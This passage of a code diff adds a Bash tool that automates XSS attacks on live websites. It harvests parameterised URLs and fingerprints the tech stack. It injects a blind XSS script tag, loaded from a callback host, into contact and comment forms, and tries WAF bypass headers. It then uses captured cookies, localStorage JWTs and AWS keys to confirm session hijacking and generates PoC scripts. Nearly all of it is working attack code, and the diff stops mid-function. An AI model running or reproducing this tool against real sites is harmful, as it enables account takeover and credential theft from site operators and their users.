+            timeout 120 katana -list "$ct" -d "$depth" -f qurl -silent -no-color -jc 2>/dev/null | \
+                grep -iE "\.${domain}|^${domain}" > "$OUTDIR/urls/sources/katana.txt" || true
+        fi
+    fi
+
+    [[ -n "$listfile" && -f "$listfile" ]] && cat "$listfile" > "$OUTDIR/urls/sources/user.txt"
+
+    for src in sitemap wayback katana user; do
+        local f="$OUTDIR/urls/sources/${src}.txt"
+        [[ -s "$f" ]] && cat "$f" >> "$OUTDIR/urls/raw.txt"
+    done
+
+    grep -E '\?[^=]+=' "$OUTDIR/urls/raw.txt" 2>/dev/null | \
+        grep -iE "\.${domain}|^${domain}" | sort -u > "$OUTDIR/urls/withparams.txt" || : > "$OUTDIR/urls/withparams.txt"
+
+    if [[ ! -s "$OUTDIR/urls/withparams.txt" && -n "$domain" ]]; then
+        echo "https://$domain/?q=test&s=test&id=1&search=test" > "$OUTDIR/urls/withparams.txt"
+    fi
+
+    : > "$OUTDIR/urls/ext_filtered.txt"
+    while IFS= read -r u; do
+        [[ -z "$u" ]] && continue
+        url_has_skip_ext "$u" || echo "$u" >> "$OUTDIR/urls/ext_filtered.txt"
+    done < "$OUTDIR/urls/withparams.txt"
+
+    dedup_urls "$OUTDIR/urls/ext_filtered.txt" "$OUTDIR/urls/unique.txt"
+    sort_by_priority "$OUTDIR/urls/unique.txt" "$OUTDIR/urls/priority.txt"
+    head -n "$MAX_URLS" "$OUTDIR/urls/priority.txt" > "$OUTDIR/urls/targets.txt"
+
+    STAT_URLS=$(wc -l < "$OUTDIR/urls/targets.txt" 2>/dev/null || echo 0)
+    ok "Targets: $STAT_URLS"
+}
+
+dedup_urls() {
+    local input="$1" output="$2"
+    [[ ! -s "$input" ]] && { : > "$output"; return; }
+    python3 - "$input" "$output" <<'PY'
+import sys, urllib.parse
+inp, outp = sys.argv[1], sys.argv[2]
+seen, order = set(), []
+with open(inp, errors='ignore') as f:
+    for line in f:
+        url = line.strip()
+        if not url or url.startswith('#'): continue
+        try:
+            p = urllib.parse.urlparse(url)
+            keys = sorted(urllib.parse.parse_qs(p.query, keep_blank_values=True).keys())
+            fp = f"{p.scheme}://{p.netloc}{p.path}?" + "&".join(f"{k}=" for k in keys)
+            if fp not in seen:
+                seen.add(fp); order.append(url)
+        except: continue
+with open(outp, 'w') as f:
+    for u in order: f.write(u + "\n")
+PY
+}
+
+sort_by_priority() {
+    local input="$1" output="$2"
+    [[ ! -s "$input" ]] && { : > "$output"; return; }
+    local tmp; tmp=$(mktemp)
+    while IFS= read -r url; do
+        [[ -z "$url" ]] && continue
+        local q="${url#*\?}" score=0
+        for i in q search query id file url redirect return next callback path page view load include doc template render lang debug admin api token key secret auth pass user email cmd exec; do
+            [[ "$q" == *"$i="* ]] && score=$((score+10))
+        done
+        printf '%d\t%s\n' "$score" "$url" >> "$tmp"
+    done < "$input"
+    sort -rn "$tmp" | cut -f2- > "$output"
+    rm -f "$tmp"
+}
+
+# ════════════════════════════════════════════════════════════
+#  DISCOVERY
+# ════════════════════════════════════════════════════════════
+path_discovery() {
+    local domain="${1:-}"
+    [[ -z "$domain" ]] && return
+    info "Path discovery"
+    local paths="admin panel dashboard api api/v1 wp-admin"
+    local out="$OUTDIR/urls/sources/paths.txt"
+    : > "$out"
+    local found=0
+    for path in $paths; do
+        local url="https://${domain}/${path}"
+        local code; code=$(_curl -o /dev/null -w '%{http_code}' "$url" 2>/dev/null || echo "000")
+        case "$code" in
+            200|301|302|401|403)
+                echo "$url" >> "$out"
+                found=$((found+1))
+                if [[ -z "$ADMIN_PANEL" && ( "$path" == "admin" || "$path" == "panel" || "$path" == "wp-admin" ) ]]; then
+                    ADMIN_PANEL="$url"
+                    hit "Admin: $ADMIN_PANEL"
+                fi
+                ;;
+        esac
+    done
+    (( found > 0 )) && ok "path-disc: $found"
+}
+
+fingerprint_stack() {
+    local targets="$1"
+    [[ ! -s "$targets" ]] && return
+    local sample; sample=$(head -1 "$targets")
+    local combined; combined=$(_curl "$sample" 2>/dev/null || echo "")
+    local -a detected=()
+    echo "$combined" | grep -qi "wp-content\|wp-includes" && detected+=("wordpress")
+    echo "$combined" | grep -qi "laravel" && detected+=("laravel")
+    echo "$combined" | grep -qi "_next/" && detected+=("nextjs")
+    echo "$combined" | grep -qi "csrfmiddleware" && detected+=("django")
+    echo "$combined" | grep -qi "ng-version\|angular" && detected+=("angular")
+    echo "$combined" | grep -qi "__vue__\|vue\.js" && detected+=("vue")
+    echo "$combined" | grep -qi "react" && detected+=("react")
+    echo "$combined" | grep -qi "jquery" && detected+=("jquery")
+    if (( ${#detected[@]} > 0 )); then
+        TECH_STACK=$(IFS=','; echo "${detected[*]}")
+        ok "Tech: $TECH_STACK"
+    fi
+}
+
+# ════════════════════════════════════════════════════════════
+#  AUTO-DETECT URL
+# ════════════════════════════════════════════════════════════
+auto_detect_url() {
+    local url="${1:-}"
+    info "Auto-detect URL"
+
+    if [[ "$url" == *"?"* && "$url" == *"="* ]]; then
+        ok "URL punya param"
+        echo "$url" > "$OUTDIR/urls/targets.txt"
+        STAT_URLS=1
+        return
+    fi
+
+    info "URL tanpa param — fuzz dulu"
+    : > "$OUTDIR/urls/targets.txt"
+    local common="q s search query id file url redirect return next callback path page view load include"
+    local found=0
+    for p in $common; do
+        local marker="pz${RANDOM}$$"
+        local test_url="${url}?${p}=${marker}"
+        local resp; resp=$(_curl "$test_url") || continue
+        if echo "$resp" | grep -qF "$marker"; then
+            echo "$test_url" >> "$OUTDIR/urls/targets.txt"
+            found=$((found+1))
+            vlog "  reflect: ?${p}="
+        fi
+    done
+
+    if (( found > 0 )); then
+        ok "Param reflect: $found"
+        STAT_URLS=$found
+        return
+    fi
+
+    warn "Gak ada param reflect — crawl site"
+    if command -v katana &>/dev/null; then
+        timeout 60 katana -u "$url" -d 1 -f qurl -silent -no-color -jc 2>/dev/null | \
+            grep -E '\?[^=]+=' > "$OUTDIR/urls/targets.txt" || true
+    fi
+
+    if [[ ! -s "$OUTDIR/urls/targets.txt" ]]; then
+        warn "Katana gak hasil — fallback manual"
+        echo "$url" > "$OUTDIR/urls/targets.txt"
+    fi
+
+    STAT_URLS=$(wc -l < "$OUTDIR/urls/targets.txt" 2>/dev/null || echo 0)
+    ok "Targets: $STAT_URLS"
+}
+
+# ════════════════════════════════════════════════════════════
+#  CALLBACK
+# ════════════════════════════════════════════════════════════
+interactsh_start() {
+    command -v interactsh-client &>/dev/null || { warn "interactsh-client gak ada"; return 1; }
+    info "Starting interactsh..."
+    local out="$OUTDIR/callbacks/out.jsonl"
+    local log="$OUTDIR/callbacks/log.txt"
+    : > "$out"; : > "$log"
+    interactsh-client -json -o "$out" > "$log" 2>&1 &
+    INTERACTSH_PID=$!
+    local tries=0
+    while (( tries < 20 )); do
+        local dom; dom=$(grep -oE '[a-z0-9]{20,}\.oast\.[a-z]+' "$log" 2>/dev/null | head -1)
+        [[ -n "$dom" ]] && { INTERACTSH_DOMAIN="$dom"; CALLBACK_URL="$dom"; ok "Callback: $dom"; return 0; }
+        sleep 0.5; tries=$((tries+1))
+    done
+    warn "domain belum kebaca"
+}
+
+interactsh_stop() {
+    [[ -n "$INTERACTSH_PID" ]] && kill "$INTERACTSH_PID" 2>/dev/null || true
+    INTERACTSH_PID=""
+}
+
+callback_setup() {
+    (( DO_CALLBACK == 0 )) && return
+    if [[ "$CALLBACK_URL" == "auto" ]]; then
+        interactsh_start
+    elif [[ -n "$CALLBACK_URL" ]]; then
+        CALLBACK_URL="${CALLBACK_URL#https://}"
+        CALLBACK_URL="${CALLBACK_URL#http://}"
+        CALLBACK_URL="${CALLBACK_URL%/}"
+        ok "Callback: $CALLBACK_URL"
+    fi
+}
+
+# ════════════════════════════════════════════════════════════
+#  BLIND XSS
+# ════════════════════════════════════════════════════════════
+blind_xss_scan() {
+    local targets="$1"
+    [[ -z "$CALLBACK_URL" ]] && return
+    [[ ! -s "$targets" ]] && return
+    info "Blind XSS → $CALLBACK_URL"
+
+    local payload="\"><script src=//${CALLBACK_URL}></script>"
+    local candidates
+    candidates=$(grep -iE '/(contact|feedback|comment|profile|support|ticket|review)' "$targets" 2>/dev/null | head -10)
+    [[ -z "$candidates" ]] && candidates=$(head -5 "$targets")
+
+    while IFS= read -r url; do
+        [[ -z "$url" ]] && continue
+        local enc_pl; enc_pl=$(printf '%s' "$payload" | jq -sRr @uri 2>/dev/null)
+        if [[ "$url" == *"?"* ]]; then
+            _curl "${url}&comment=${enc_pl}" >/dev/null 2>&1 || true
+        else
+            curl -sk --max-time "$TIMEOUT" -X POST -d "comment=$payload" -d "message=$payload" "$url" >/dev/null 2>&1 || true
+        fi
+    done <<< "$candidates"
+    ok "Blind injected"
+}
+
+# ════════════════════════════════════════════════════════════
+#  STORED VERIFY
+# ════════════════════════════════════════════════════════════
+stored_verify() {
+    local url="$1" payload="$2"
+    (( STORED_VERIFY == 1 )) || return 1
+    sleep 2
+    local resp; resp=$(_curl "$url") || return 1
+    echo "$resp" | grep -qF "$payload" && return 0
+    return 1
+}
+
+# ════════════════════════════════════════════════════════════
+#  DOM SCAN
+# ════════════════════════════════════════════════════════════
+dom_scan() {
+    local url="$1"
+    command -v node &>/dev/null || return 1
+    npx playwright --version &>/dev/null || return 1
+
+    local tmp_js="$OUTDIR/exploits/dom_check.js"
+    cat > "$tmp_js" <<'JS'
+const { chromium } = require('playwright');
+(async () => {
+  const url = process.argv[2];
+  let triggered = false, evidence = '';
+  try {
+    const browser = await chromium.launch({ headless: true, args: ['--no-sandbox', '--disable-dev-shm-usage'] });
+    const ctx = await browser.newContext({ ignoreHTTPSErrors: true });
+    const page = await ctx.newPage();
+    page.on('dialog', async d => { triggered = true; evidence = `dialog: ${d.message()}`; await d.dismiss(); });
+    await page.addInitScript(() => {
+      window.__SJ_HITS = [];
+      window.__XSS_CONFIRMED = false;
+      const re = /<[a-z]|javascript:|on\w+=/i;
+      const hook = (obj, prop, label) => {
+        try {
+          const o = obj[prop]; if (typeof o !== 'function') return;
+          obj[prop] = function(...a) {
+            const s = String(a[0]||'');
+            if (re.test(s)) window.__SJ_HITS.push({sink: label, arg: s.slice(0,200)});
+            return o.apply(this, a);
+          };
+        } catch(e){}
+      };
+      hook(document, 'write', 'document.write');
+      try {
+        Object.defineProperty(Element.prototype, 'innerHTML', {
+          set(v) { if (re.test(String(v))) window.__SJ_HITS.push({sink:'innerHTML', arg:String(v).slice(0,200)}); this.__v = v; },
+          get() { return this.__v || ''; }
+        });
+      } catch(e){}
+      const _e = window.eval;
+      window.eval = function(s) { if (/alert|XSS/.test(String(s))) window.__XSS_CONFIRMED = true; return _e.apply(this, arguments); };
+      hook(window, 'setTimeout', 'setTimeout');
+      hook(window, 'setInterval', 'setInterval');
+    });
+    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 });
+    await page.waitForTimeout(2000);
+    const hits = await page.evaluate(() => window.__SJ_HITS || []);
+    const flag = await page.evaluate(() => window.__XSS_CONFIRMED === true).catch(() => false);
+    await browser.close();
+    console.log(JSON.stringify({ triggered: triggered || flag, hits }));
+  } catch (e) {
+    console.log(JSON.stringify({ triggered: false, hits: [] }));
+  }
+})();
+JS
+
+    local r; r=$(timeout 25 node "$tmp_js" "$url" 2>/dev/null || echo '{"triggered":false,"hits":[]}')
+    local ex; ex=$(echo "$r" | jq -r '.triggered' 2>/dev/null || echo "false")
+    if [[ "$ex" == "true" ]]; then
+        echo "$r" > "$OUTDIR/impact/dom-evidence.json"
+        return 0
+    fi
+    return 1
+}
+
+# ════════════════════════════════════════════════════════════
+#  WAF HEADER BYPASS
+# ════════════════════════════════════════════════════════════
+waf_header_bypass() {
+    local url="$1"
+    local -a hdrs=(
+        "X-Forwarded-For: 127.0.0.1"
+        "X-Real-IP: 127.0.0.1"
+        "X-Originating-IP: 127.0.0.1"
+        "Referer: https://google.com"
+        "Origin: https://google.com"
+    )
+    local hdr
+    for hdr in "${hdrs[@]}"; do
+        local resp
+        resp=$(curl -sk --max-time "$TIMEOUT" -H "$hdr" "$url" 2>/dev/null || echo "")
+        if [[ -n "$resp" ]] && ! looks_blocked "$resp" "200"; then
+            echo "$hdr" > "$OUTDIR/impact/header-bypass.txt"
+            vlog "  header bypass OK: $hdr"
+            return 0
+        fi
+    done
+    return 1
+}
+
+# ════════════════════════════════════════════════════════════
+#  IMPACT VERIFY
+# ════════════════════════════════════════════════════════════
+verify_cookie_replay() {
+    local cookie="$1" url="$2"
+    [[ -z "$cookie" || -z "$url" ]] && return 1
+    local resp; resp=$(_curl_cookie "$url" "$cookie") || return 1
+    [[ -z "$resp" ]] && return 1
+    echo "$resp" | grep -qiE '<form[^>]*login|signin|type=["'"'"']?password' && return 1
+    echo "$resp" | grep -qiE 'logout|dashboard|profile|account|welcome|sign.?out' && return 0
+    return 1
+}
+
+verify_jwt() {
+    local jwt="$1" url="$2"
+    [[ -z "$jwt" || -z "$url" ]] && return 1
+    local payload_b64; payload_b64=$(echo "$jwt" | cut -d. -f2)
+    [[ -z "$payload_b64" ]] && return 1
+    local pad=$(( 4 - ${#payload_b64} % 4 ))
+    [[ $pad -ne 4 ]] && payload_b64="${payload_b64}$(printf '=%.0s' $(seq 1 $pad))"
+    local decoded; decoded=$(echo "$payload_b64" | tr '_-' '/+' | base64 -d 2>/dev/null || echo "")
+    [[ -z "$decoded" ]] && return 1
+    echo "$decoded" > "$OUTDIR/impact/jwt-decoded.json"
+    local host; host=$(echo "$url" | awk -F/ '{print $1"//"$3}')
+    for ep in "/api/me" "/api/user" "/api/profile" "/user" "/me"; do
+        local resp; resp=$(curl -sk --max-time "$TIMEOUT" -H "Authorization: Bearer $jwt" "${host}${ep}" 2>/dev/null || echo "")
+        echo "$resp" | grep -qE '"user"|"email"|"id"|"role"|"username"|"sub"' && {
+            echo "$resp" > "$OUTDIR/impact/jwt-test-response.json"
+            return 0
+        }
+    done
+    return 1
+}
+
+verify_aws_key() {
+    local key="$1"
+    [[ -z "$key" ]] && return 1
+    echo "$key" | grep -qE 'AKIA[A-Z0-9]{16}' && {
+        echo "$key" > "$OUTDIR/impact/aws-key.txt"
+        return 0
+    }
+    return 1
+}
+
+run_impact_verify() {
+    local url="$1" payload="$2" impact_type="$3"
+    case "$impact_type" in
+        cookie-exfil)
+            local cb_cookie=""
+            [[ -f "$OUTDIR/callbacks/out.jsonl" ]] && \
+                cb_cookie=$(grep -oE 'c=[A-Za-z0-9%]+' "$OUTDIR/callbacks/out.jsonl" 2>/dev/null | head -1 | cut -d= -f2 | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))" 2>/dev/null || echo "")
+            [[ -n "$cb_cookie" ]] && verify_cookie_replay "$cb_cookie" "$url" && { echo "cookie-replay-verified"; return 0; }
+            [[ -n "$COOKIE" ]] && verify_cookie_replay "$COOKIE" "$url" && { echo "cookie-session-valid"; return 0; }
+            ;;
+        storage-dump)
+            local jwt=""
+            [[ -f "$OUTDIR/callbacks/out.jsonl" ]] && \
+                jwt=$(grep -oE 'ls=[A-Za-z0-9+/=%]+' "$OUTDIR/callbacks/out.jsonl" 2>/dev/null | head -1 | cut -d= -f2 | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))" 2>/dev/null || echo "")
+            [[ -n "$jwt" ]] && verify_jwt "$jwt" "$url" && { echo "jwt-verified"; return 0; }
+            ;;
+        ssrf-metadata)
+            local aws_key=""
+            [[ -f "$OUTDIR/callbacks/out.jsonl" ]] && aws_key=$(grep -oE 'AKIA[A-Z0-9]{16}' "$OUTDIR/callbacks/out.jsonl" 2>/dev/null | head -1)
+            [[ -z "$aws_key" ]] && aws_key=$(echo "$payload" | grep -oE 'AKIA[A-Z0-9]{16}' | head -1)
+            [[ -n "$aws_key" ]] && verify_aws_key "$aws_key" && { echo "aws-key-verified"; return 0; }
+            ;;
+    esac
+    return 1
+}
+
+# ════════════════════════════════════════════════════════════
+#  RECORD FINDING
+# ════════════════════════════════════════════════════════════
+record_finding() {
+    local url="$1" param="$2" payload="$3" ctx="$4" verified="$5" evidence="$6" confidence="$7"
+    local impact_info="${8:-}"
+    local impact_type impact_sev impact_chain
+    IFS='|' read -r impact_type impact_sev impact_chain <<< "${impact_info:-$(detect_impact "$payload")}"
+
+    confidence=$(csp_confidence_adjust "$confidence")
+
+    local ts; ts=$(date -Iseconds)
+    local score cvec
+    case "$impact_sev" in
+        critical) score="9.3"; cvec="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N" ;;
+        high)     score="8.2"; cvec="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N" ;;
+        medium)   score="6.1"; cvec="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N" ;;
+        *)        score="4.3"; cvec="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N" ;;
+    esac
+
+    local poc; poc=$(build_url "$url" "$param" "$payload" 2>/dev/null || echo "$url")
+
+    local verified_impact=""
+    if (( VERIFY_IMPACT == 1 )); then
+        verified_impact=$(run_impact_verify "$url" "$payload" "$impact_type")
+        [[ -n "$verified_impact" ]] && STAT_VERIFIED=$((STAT_VERIFIED+1))
+    fi
+
+    {
+        echo "═══════════════════════════════════════════════════════════"
+        echo "[$impact_sev] conf=$confidence impact=$impact_type csp=$CSP_MODE $ts"
+        echo "Endpoint  : $url"
+        echo "Parameter : $param"
+        echo "Context   : $ctx"
+        echo "Payload   : $payload"
+        echo "Verified  : $verified"
+        echo "Impact    : $impact_type"
+        echo "Chain     : $impact_chain"
+        [[ -n "$verified_impact" ]] && echo "Impact OK : $verified_impact"
+        echo "CSP       : $CSP_MODE"
+        echo "CVSS      : $score ($impact_sev) $cvec"
+        echo "PoC       : $poc"
+        echo "═══════════════════════════════════════════════════════════"
+        echo ""
+    } | tee -a "$VULN_LOG"
+
+    python3 - "$JSON_LOG" "$url" "$param" "$payload" "$ctx" "$verified" "$evidence" "$ts" "$score" "$impact_sev" "$cvec" "$poc" "$confidence" "$impact_type" "$impact_chain" "$verified_impact" "$CSP_MODE" <<'PYJ' 2>/dev/null || \
+        echo "[$impact_sev] $url $param" >> "$JSON_LOG.fallback"
+import sys, json
+f, url, param, payload, ctx, verified, evidence, ts, score, sev, cvec, poc, conf, impact, chain, vimpact, csp = sys.argv[1:]
+try:
+    data = json.load(open(f))
+except:
+    data = []
+data.append({
+    "ts": ts, "url": url, "param": param, "payload": payload,
+    "context": ctx, "verified": verified, "evidence": evidence,
+    "cvss_score": score, "severity": sev, "cvss_vector": cvec,
+    "confidence": conf, "impact": impact, "chain": chain, "poc": poc,
+    "verified_impact": vimpact, "csp": csp,
+    "tool": "sapujagat", "by": "BimaKesengsaraan"
+})
+json.dump(data, open(f, "w"), indent=2)
+PYJ
+    STAT_FINDINGS=$((STAT_FINDINGS+1))
+    [[ "$impact_sev" == "critical" || "$impact_sev" == "high" ]] && STAT_IMPACT=$((STAT_IMPACT+1))
+}
+
+# ════════════════════════════════════════════════════════════
+#  ADAPTIVE SCAN — ROTATION
+# ════════════════════════════════════════════════════════════
+manual_scan() {
+    local targets="$1"
+    [[ ! -s "$targets" ]] && return
+    info "Adaptive scan (rotation $MAX_ROTATION)"
+
+    local total; total=$(wc -l < "$targets")
+    local i=0
+
+    while IFS= read -r url; do
+        [[ -z "$url" ]] && continue
+        i=$((i+1))
+        (( QUIET == 0 )) && printf "\r   ${C}[%d/%d]${NC} scan " "$i" "$total" >&2
+
+        url="${url%%#*}"
+        local base="${url%%\?*}" query="${url#*\?}"
+        [[ "$query" == "$url" ]] && continue
+
+        IFS='&' read -ra params <<< "$query"
+        for p in "${params[@]}"; do
+            local key="${p%%=*}"
+            [[ -z "$key" ]] && continue
+            [[ "$key" =~ ^(csrf|token|nonce|sess|session)$ ]] && continue
+            STAT_PARAMS=$((STAT_PARAMS+1))
+
+            local flags; flags=$(analyze_filter "$url" "$key")
+            [[ "$flags" == "BLOCKED" || "$flags" == "NONE" ]] && continue
+            vlog "flags[$key]=$flags"
+
+            (( CSP_DETECT == 1 )) && detect_csp "$url" 2>/dev/null || true
+
+            local probe_marker="sjc${RANDOM}$$"
+            local probe_inj; probe_inj=$(build_url "$url" "$key" "Aa1${probe_marker}<b>\"c'd/f")
+            local probe_resp; probe_resp=$(_curl "$probe_inj") || continue
+            local ctx; ctx=$(detect_context_at_marker "$probe_resp" "Aa1${probe_marker}")
+            vlog "context: $ctx"
+
+            local rotated=0
+            while IFS= read -r payload; do
+                [[ -z "$payload" ]] && continue
+                (( rotated >= MAX_ROTATION )) && break
+                rotated=$((rotated+1))
+                STAT_PAYLOADS=$((STAT_PAYLOADS+1))
+
+                local mut
+                for mut in $(mutate_payload "$payload"); do
+                    [[ -z "$mut" ]] && continue
+                    (( ${#mut} < MIN_REFLECTION_LEN )) && continue
+
+                    local inj; inj=$(build_url "$url" "$key" "$mut")
+                    local resp; resp=$(_curl "$inj") || continue
+
+                    looks_blocked "$resp" "$CB_LAST_STATUS" && continue
+                    (( STRICT_CONTENT_TYPE == 1 )) && ! is_xss_ctype "$CB_LAST_CTYPE" && continue
+
+                    local is_raw=0
+                    echo "$resp" | grep -qF "$mut" && is_raw=1
+
+                    local conf="low"
+                    if (( is_raw == 1 )); then
+                        local real_ctx; real_ctx=$(detect_context_at_marker "$resp" "$mut")
+                        context_allows_inline "$real_ctx" && conf="high" || conf="medium"
+                    elif is_encoded_reflection "$resp" "$mut"; then
+                        log_candidate "$url" "$key" "$mut" "encoded"
+                        continue
+                    else
+                        continue
+                    fi
+
+                    local verified="reflection"
+                    (( STORED_VERIFY == 1 )) && stored_verify "$url" "$mut" && verified="stored-verified"
+                    (( DOM_SCAN == 1 )) && dom_scan "$inj" && verified="dom-confirmed"
+
+                    record_finding "$url" "$key" "$mut" "$ctx:$flags" "$verified" "" "$conf"
+                    break 2
+                done
+            done < <(select_payloads_by_context "$ctx" "$flags")
+        done
+    done < "$targets"
+    (( QUIET == 0 )) && printf "\r%*s\r" 60 "" >&2
+    ok "Scan complete: $(jq 'length' "$JSON_LOG" 2>/dev/null || echo 0) findings"
+}
+
+# ════════════════════════════════════════════════════════════
+#  PART 4 — CHAIN, REPORT, POC, SELFTEST, MAIN
+# ════════════════════════════════════════════════════════════
+
+# ════════════════════════════════════════════════════════════
+#  CHAIN ENGINE
+# ════════════════════════════════════════════════════════════
+CHAIN_LOG=""
+
+record_chain() {
+    local chain_type="$1" target="$2" status="$3" evidence="$4"
+    [[ -z "$CHAIN_LOG" ]] && return
+    local ts; ts=$(date -Iseconds)
+    python3 - "$CHAIN_LOG" "$chain_type" "$target" "$status" "$evidence" "$ts" <<'PY' 2>/dev/null || true
+import sys, json
+f, ctype, tgt, status, ev, ts = sys.argv[1:]
+try:
+    data = json.load(open(f))
+except:
+    data = []
+data.append({
+    "ts": ts, "chain": ctype, "target": tgt, "status": status,
+    "evidence": ev, "tool": "sapujagat", "by": "BimaKesengsaraan"
+})
+json.dump(data, open(f, "w"), indent=2)
+PY
+}
+
+csrf_extract() {
+    local url="$1"
+    local resp; resp=$(_curl "$url") || return 1
+    local token
+    token=$(echo "$resp" | grep -oE '<meta[^>]*name=["'"'"'](csrf-token|_csrf|authenticity_token|__RequestVerificationToken)["'"'"'][^>]*content=["'"'"']([^"'"'"']+)' | grep -oE 'content=["'"'"'][^"'"'"']+' | sed "s/content=[\"']//" | head -1)
+    [[ -z "$token" ]] && token=$(echo "$resp" | grep -oE 'name="?(csrf|_token|_csrf|authenticity_token|__RequestVerificationToken|_xsrf)"?[^>]*value="([^"]+)"' | grep -oE 'value="[^"]+"' | sed 's/value="//;s/"//' | head -1)
+    [[ -n "$token" ]] && { echo "$token"; return 0; }
+    return 1
+}
+
+chain_msg() { echo -e "   ${M}⚡${NC} $*"; }
+
+chain_cookie_replay() {
+    local url="$1" payload="$2"
+    [[ -z "$CHAIN_LOG" ]] && return 1
+    chain_msg "CHAIN: cookie-replay — $url"
+
+    local cb_cookie=""
+    [[ -f "$OUTDIR/callbacks/out.jsonl" ]] && \
+        cb_cookie=$(grep -oE 'c=[A-Za-z0-9%]+' "$OUTDIR/callbacks/out.jsonl" 2>/dev/null | head -1 | cut -d= -f2 | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))" 2>/dev/null || echo "")
+    [[ -z "$cb_cookie" && -n "$COOKIE" ]] && cb_cookie="$COOKIE"
+
+    if [[ -z "$cb_cookie" ]]; then
+        record_chain "cookie-replay" "$url" "armed" "no-cookie-source"
+        return 1
+    fi
+
+    if verify_cookie_replay "$cb_cookie" "$url"; then
+        chain_msg "  ✓ VERIFIED: session valid"
+        record_chain "cookie-replay" "$url" "verified" "session-valid"
+        STAT_VERIFIED=$((STAT_VERIFIED+1))
+        return 0
+    fi
+    record_chain "cookie-replay" "$url" "failed" "no-session-indicator"
+    return 1
+}
+
+chain_jwt_decode() {
+    local url="$1" payload="$2"
+    [[ -z "$CHAIN_LOG" ]] && return 1
+    chain_msg "CHAIN: jwt-decode — $url"
+
+    local jwt=""
+    if [[ -f "$OUTDIR/callbacks/out.jsonl" ]]; then
+        local b64
+        b64=$(grep -oE 'ls=[A-Za-z0-9+/=%]+' "$OUTDIR/callbacks/out.jsonl" 2>/dev/null | head -1 | cut -d= -f2 | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))" 2>/dev/null || echo "")
+        if [[ -n "$b64" ]]; then
+            local decoded
+            decoded=$(echo "$b64" | base64 -d 2>/dev/null || echo "")
+            if [[ -n "$decoded" ]]; then
+                echo "$decoded" > "$OUTDIR/impact/storage-dump.json"
+                jwt=$(echo "$decoded" | grep -oE '"token"\s*:\s*"[^"]+"' | head -1 | sed 's/.*"token"\s*:\s*"//;s/"$//')
+            fi
+        fi
+    fi
+
+    if [[ -z "$jwt" ]]; then
+        record_chain "jwt-decode" "$url" "armed" "no-jwt-source"
+        return 1
+    fi
+
+    if verify_jwt "$jwt" "$url"; then
+        chain_msg "  ✓ VERIFIED: JWT valid"
+        record_chain "jwt-decode" "$url" "verified" "token-valid"
+        STAT_VERIFIED=$((STAT_VERIFIED+1))
+        return 0
+    fi
+    record_chain "jwt-decode" "$url" "failed" "endpoint-reject"
+    return 1
+}
+
+chain_aws_key() {
+    local url="$1" payload="$2"
+    [[ -z "$CHAIN_LOG" ]] && return 1
+    chain_msg "CHAIN: aws-key — $url"
+
+    local aws_key=""
+    [[ -f "$OUTDIR/callbacks/out.jsonl" ]] && aws_key=$(grep -oE 'AKIA[A-Z0-9]{16}' "$OUTDIR/callbacks/out.jsonl" 2>/dev/null | head -1)
+    [[ -z "$aws_key" ]] && aws_key=$(echo "$payload" | grep -oE 'AKIA[A-Z0-9]{16}' | head -1)
+
+    if [[ -z "$aws_key" ]]; then
+        record_chain "aws-key" "$url" "armed" "no-akia-pattern"
+        return 1
+    fi
+
+    if verify_aws_key "$aws_key"; then
+        chain_msg "  ✓ VERIFIED: AKIA format"
+        record_chain "aws-key" "$url" "verified" "akia-valid:$aws_key"
+        STAT_VERIFIED=$((STAT_VERIFIED+1))
+        return 0
+    fi
+    record_chain "aws-key" "$url" "failed" "invalid-format"
+    return 1
+}
+
+run_chain_engine() {
+    local url="$1" payload="$2" impact_type="$3"
+    [[ -z "$CHAIN_LOG" ]] && return 0
+    case "$impact_type" in
+        cookie-exfil)  chain_cookie_replay "$url" "$payload" ;;
+        storage-dump)  chain_jwt_decode "$url" "$payload" ;;
+        ssrf-metadata) chain_aws_key "$url" "$payload" ;;
+    esac
+}
+
+# ════════════════════════════════════════════════════════════
+#  POC GENERATOR
+# ════════════════════════════════════════════════════════════
+generate_poc_scripts() {
+    local finding_json="$1"
+    local out="$OUTDIR/exploits"
+    mkdir -p "$out"
+    [[ ! -s "$finding_json" ]] && return
+    local idx=0
+    while IFS= read -r line; do
+        idx=$((idx+1))
+        local url param payload poc impact vimpact
+        url=$(echo "$line" | jq -r '.url // ""')
+        param=$(echo "$line" | jq -r '.param // ""')
+        payload=$(echo "$line" | jq -r '.payload // ""')
+        poc=$(echo "$line" | jq -r '.poc // ""')
+        impact=$(echo "$line" | jq -r '.impact // "unknown"')
+        vimpact=$(echo "$line" | jq -r '.verified_impact // ""')
+        local f="$out/poc-${idx}.sh"
+        cat > "$f" <<POC
+#!/usr/bin/env bash
+# PoC #${idx} — ${url}
+# by BimaKesengsaraan · Karya anak bangsa
+# impact: ${impact} (${vimpact:-unverified})
+
+URL='${poc}'
+PAYLOAD='${payload}'
+
+echo "[*] \$URL"
+curl -s "\$URL" -o /tmp/sj-poc-${idx}.html -w "HTTP %{http_code}\n"
+
+if grep -qF "\$PAYLOAD" /tmp/sj-poc-${idx}.html; then
+    echo "[+] REFLECTED — vuln confirmed"
+    echo "    open: \$URL"
+else
+    echo "[-] not reflected"
+fi
+
+echo ""
+echo "[*] Impact: ${impact}"
+echo "[*] Verified: ${vimpact:-no}"
+POC
+        chmod +x "$f"
+    done < <(jq -c '.[]' "$finding_json" 2>/dev/null)
+    (( idx > 0 )) && ok "PoC: $out/ ($idx files)"
+}
+
+# ════════════════════════════════════════════════════════════
+#  REPORT
+# ════════════════════════════════════════════════════════════
+generate_reports() {
+    local base="$OUTDIR/laporan"
+    local ts; ts=$(date -Iseconds)
+    local total; total=$(jq 'length' "$JSON_LOG" 2>/dev/null || echo 0)
+    local critical; critical=$(jq '[.[]|select(.severity=="critical")]|length' "$JSON_LOG" 2>/dev/null || echo 0)
+    local verified; verified=$(jq '[.[]|select(.verified_impact != null and .verified_impact != "")]|length' "$JSON_LOG" 2>/dev/null || echo 0)
+
+    {
